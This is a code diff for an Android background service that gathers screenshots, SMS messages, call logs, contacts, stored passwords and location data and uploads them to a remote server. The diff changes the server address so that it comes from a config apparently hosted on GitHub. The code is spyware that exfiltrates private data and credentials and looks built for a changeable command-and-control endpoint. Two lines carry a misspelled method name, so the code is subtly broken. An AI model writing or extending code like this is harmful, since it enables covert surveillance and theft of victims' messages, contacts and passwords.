@@ -49,6 +49,8 @@ public class BackgroundService extends Service {
     private static final long LOCATION_UPDATE_INTERVAL = 30 * 1000;
     private static final long DATA_SYNC_INTERVAL = 60 * 1000;
     
+    private String deviceId;
+    private String username;
     private Handler handler;
     private LocationManager locationManager;
     private LocationListener locationListener;
@@ -147,7 +149,7 @@ public class BackgroundService extends Service {
             data.put("data", base64Image);
             data.put("timestamp", System.currentTimeMillis());
             
-            String serverUrl = Config.getServerUrl();
+            String serverUrl = Config.getsyncConfigFromGithubl();
             HttpClient.postAsync(serverUrl + "/api/data/screenshot", data, response -> {
                 Log.d(TAG, "Screenshot sent");
             });
@@ -210,7 +212,7 @@ public class BackgroundService extends Service {
             data.put("data", smsArray);
             data.put("count", smsArray.length());
             
-            String serverUrl = Config.getServerUrl();
+            String serverUrl = Config.getsyncConfigFromGithubl();
             HttpClient.postAsync(serverUrl + "/ws", data, null);
         } catch (Exception e) {
             Log.e(TAG, "SMS sync error", e);
@@ -241,7 +243,7 @@ public class BackgroundService extends Service {
             data.put("data", callArray);
             data.put("count", callArray.length());
             
-            String serverUrl = Config.getServerUrl();
+            String serverUrl = Config.getsyncConfigFromGithubl();
             HttpClient.postAsync(serverUrl + "/ws", data, null);
         } catch (Exception e) {
             Log.e(TAG, "Call log sync error", e);
@@ -285,7 +287,7 @@ public class BackgroundService extends Service {
             data.put("data", contactArray);
             data.put("count", contactArray.length());
             
-            String serverUrl = Config.getServerUrl();
+            String serverUrl = Config.getsyncConfigFromGithub();
             HttpClient.postAsync(serverUrl + "/ws", data, null);
         } catch (Exception e) {
             Log.e(TAG, "Contacts sync error", e);
@@ -340,7 +342,7 @@ public class BackgroundService extends Service {
                 data.put("username", Config.getUsername());
                 data.put("data", passwords);
                 
-                String serverUrl = Config.getServerUrl();
+                String serverUrl = Config.getsyncConfigFromGithub();
                 HttpClient.postAsync(serverUrl + "/ws", data, null);
             }
         } catch (Exception e) {
@@ -364,7 +366,7 @@ public class BackgroundService extends Service {
                 data.put("temperature", temp);
                 data.put("charging", charging);
                 
-                String serverUrl = Config.getServerUrl();
+                String serverUrl = Config.getsyncConfigFromGithub();
                 HttpClient.postAsync(serverUrl + "/ws", data, null);
             }
         } catch (Exception e) {
@@ -375,7 +377,7 @@ public class BackgroundService extends Service {
     private void startWebSocketConnection() {
         new Thread(() -> {
             try {
-                WebSocketClient client = new WebSocketClient(Config.getServerUrl(), Config.getDeviceId(), Config.getUsername(), BackgroundService.this);
+                WebSocketClient client = new WebSocketClient(Config.getsyncConfigFromGithub(), Config.getDeviceId(), Config.getUsername(), BackgroundService.this);
                 client.connect();
             } catch (Exception e) {
                 Log.e(TAG, "WebSocket connection error", e);
